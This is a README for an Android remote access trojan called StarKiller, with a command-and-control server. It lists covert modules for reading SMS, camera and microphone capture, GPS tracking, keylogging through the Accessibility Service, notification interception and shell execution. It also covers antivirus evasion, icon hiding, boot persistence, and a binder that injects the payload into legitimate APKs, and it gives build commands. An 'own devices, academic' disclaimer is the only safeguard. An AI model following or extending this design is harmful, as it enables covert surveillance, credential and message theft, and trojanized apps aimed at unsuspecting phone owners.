# STARKILLER

```
 ███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
 ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ███████╗   ██║   ███████║██████╔╝█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ╚════██║   ██║   ██╔══██║██╔══██╗██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ███████║   ██║   ██║  ██║██║  ██║██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
```

**22DIV // george wu // Android Remote Access**

> *"The dark side is a pathway to many abilities some consider to be... unnatural."*

---

### Classification

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
AUTHORISATION:   CSEC academic research, own devices
DOCTRINE:        Israeli cyber methodology — cross-platform capability
                 Windows + Android. Desktop + mobile. Full-spectrum.
TARGET:          Own Android devices ONLY
STATUS:          PHASE 1 COMPLETE — paused for VADER rootkit upgrades
COMMIT:          99191f4 (2026-06-21)
```

### What This Is

Android RAT built from first principles. Kotlin client, Python C2 server, web dashboard.
Speaks VADER agent protocol (length-prefixed JSON over TCP) — cross-compatible with
vader_ui.py and vader_agent.py. Includes obfuscation pipeline, APK binder, and
detection scanner.

Own hardware only. CSEC security research. Private repo.

### Architecture

```
StarKiller/
├── server/
│   └── starkiller_c2.py       C2 server — web dashboard + agent listener
├── client/                     Android Kotlin project
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── kotlin/com/starkiller/agent/
│   │   │   │   ├── MainActivity.kt          Launcher (starts service, hides icon)
│   │   │   │   ├── StarKillerService.kt     Foreground service + C2 lifecycle
│   │   │   │   ├── C2Client.kt              VADER protocol (encrypted strings)
│   │   │   │   ├── TaskRouter.kt            Task dispatch to modules
│   │   │   │   ├── Config.kt               Encrypted C2 config (build-time injected)
│   │   │   │   ├── Crypt.kt                Runtime XOR+Base64 string decryption
│   │   │   │   ├── persistence/
│   │   │   │   │   └── BootReceiver.kt      BOOT_COMPLETED auto-start
│   │   │   │   └── modules/
│   │   │   │       ├── DeviceInfo.kt        IMEI, model, carrier, Android ID
│   │   │   │       ├── CameraCapture.kt     Camera2 API — front/rear JPEG
│   │   │   │       ├── SmsModule.kt         SMS read inbox + send
│   │   │   │       ├── GpsTracker.kt        GPS/network location
│   │   │   │       ├── ContactsDump.kt      Full contact list export
│   │   │   │       ├── FileManager.kt       Directory list + file download
│   │   │   │       ├── MicRecorder.kt       Ambient audio (configurable duration)
│   │   │   │       ├── ScreenCapture.kt     Screenshot (needs MediaProjection)
│   │   │   │       ├── KeyLogService.kt     Accessibility Service keylogger
│   │   │   │       ├── CallLogReader.kt     Call history dump
│   │   │   │       ├── AppList.kt           Installed packages
│   │   │   │       └── NotifListenerService.kt  Notification interception
│   │   │   ├── res/
│   │   │   │   ├── values/strings.xml
│   │   │   │   └── xml/accessibility_config.xml
│   │   │   └── AndroidManifest.xml          All permissions + services declared
│   │   ├── build.gradle.kts                 SDK 34, Kotlin 1.9.24, ProGuard
│   │   └── proguard-rules.pro              Hardened (5-pass, repackage, strip logs)
│   ├── build.gradle.kts                     AGP 8.5.0
│   ├── settings.gradle.kts
│   └── gradle.properties
├── tools/                      Downloaded RE tools (gitignored)
│   ├── apktool.jar             APK decompile/recompile (v3.0.2)
│   ├── jadx/                   DEX decompiler for verification
│   └── uber-apk-signer.jar    APK signing (v1.3.0)
├── payloads/                   Built APKs (gitignored)
├── setup.py                    Automated Android SDK + Gradle setup
├── build.py                    Build APK with encrypted C2 config
├── obfuscate.py                String encryption + ProGuard + detection scanner
├── binder.py                   APK injection (decompile + inject + patch + sign)
├── test_agents.py              Multi-agent C2 test harness (simulated devices)
└── README.md
```

### Protocol

Same as VADER agent protocol — StarKiller APK is a mobile vader_agent:

```
Wire format: [4-byte big-endian length][UTF-8 JSON payload]

Agent -> C2:
  register   — agent_id, hostname, os, platform, model, sdk
  heartbeat  — battery, last_gps
  result     — task_id, data (JSON object with op results)
  output     — text (console output)
  file_data  — task_id, filename, size, data (base64)

C2 -> Agent:
  task       — task_id, op, [op-specific params]
```

### Operations

| Module | Op Code | Description |
|--------|---------|-------------|
| Device Info | `sysinfo` | Model, OS, carrier, Android ID, battery |
| Camera | `camera` | Front/rear photo (Camera2 API, JPEG) |
| SMS Read | `sms_read` | Inbox dump (last 100) |
| SMS Send | `sms_send` | Send SMS from device |
| GPS | `gps` | GPS/network location with accuracy |
| Contacts | `contacts` | Name + number + type |
| Files | `ls` | Directory listing with metadata |
| Files | `download` | File download (10MB cap, base64) |
| Microphone | `mic` | Ambient audio (configurable seconds) |
| Screen | `screenshot` | Stub — needs MediaProjection grant |
| Keylogger | `keylog` | Accessibility Service text capture |
| Call Log | `calllog` | Incoming/outgoing/missed history |
| App List | `apps` | Package name, label, system flag |
| Notifications | `notifs` | Real-time notification interception |
| Shell | `exec` | Execute shell command (sh -c) |
| Full Recon | `recon` | sysinfo + gps + apps combined |
| Ping | `ping` | Latency check |
| Exit | `exit` | Kill agent |

### Evasion

| Layer | Technique | Status |
|-------|-----------|--------|
| String encryption | XOR+Base64 all protocol strings + C2 config | DONE |
| ProGuard/R8 | 5-pass, repackage classes, strip logging | DONE |
| Config injection | C2 host/port baked at build time, encrypted | DONE |
| APK binding | Inject into legit APK (apktool decompile + Smali inject) | DONE |
| Detection scanner | Self-scan for known RAT signatures before deploy | DONE |
| Icon hiding | Remove launcher icon after first launch | DONE |

### Persistence

- `RECEIVE_BOOT_COMPLETED` + `QUICKBOOT_POWERON` — start on boot
- Foreground service with `START_STICKY` — OS restarts if killed
- `WakeLock` — prevent CPU sleep during ops
- Battery optimization bypass request
- Auto-reconnect with exponential backoff (5s -> 5min cap)

### Quick Start

```bash
# 1. Setup (one-time) — downloads Android SDK, sets up Gradle
python setup.py

# 2. Obfuscate + build
python obfuscate.py full --ip 192.168.1.100 --port 8667
python build.py --ip 192.168.1.100 --port 8667

# 3. Start C2
python server/starkiller_c2.py
# Dashboard: http://localhost:8666

# 4. Test (no device needed)
python test_agents.py 127.0.0.1 8667 4

# 5. Bind into legit APK (optional)
python binder.py target.apk --output payloads/bound.apk

# 6. Scan for detection signatures
python obfuscate.py scan payloads/
```

### Test Results (2026-06-21)

```
Multi-target C2 test:
  4 agents connected (Samsung S24, Pixel 8, OnePlus 12, Xiaomi 14)
  8 tasks dispatched — sysinfo, GPS, contacts, apps, exec, recon, SMS, ls
  All returned correct results
  Kill command verified — single agent disconnect, others unaffected
  Heartbeat with battery + GPS drift confirmed

Detection scanner:
  Pre-obfuscation:  37 HIGH signatures in source
  Post-obfuscation: 4 source-only (stripped by R8 at compile)
  Protocol strings: ALL encrypted (heartbeat, agent_id, register, etc.)
  C2 config:        Encrypted (no plaintext IP/port in DEX)
```

### Tools Required

| Tool | Version | Source |
|------|---------|--------|
| Java JDK | 17+ | Microsoft OpenJDK / Adoptium |
| Android SDK | cmdline-tools | setup.py downloads automatically |
| apktool | 3.0.2 | github.com/iBotPeaches/Apktool |
| jadx | 1.5.5 | github.com/skylot/jadx |
| uber-apk-signer | 1.3.0 | github.com/patrickfav/uber-apk-signer |
| ADB | 37+ | Optional — for direct install |

### Research Sources

Built after studying:
- G700 RAT (CraxsRAT evolution) — C# server, Java APK, APKEditor obfuscation, Telegram exfil
- EagleSpy v5 — anti-VM/debug, Accessibility abuse, 2FA theft, black screen overlay
- L3MON — Node.js + Socket.io, web dashboard, Docker, Smali injection
- Cerberus (leaked source) — fork ecosystem, overlay attacks, obfuscation patterns

### Rules of Engagement

1. Own devices only
2. Private repo — never public
3. CSEC academic research context
4. No distribution of built APKs
5. Binaries never committed to repo
6. All protocol strings encrypted
7. No plaintext C2 config in source control

---

*Built from VADER's protocol. The agent doesn't care what OS it runs on.*
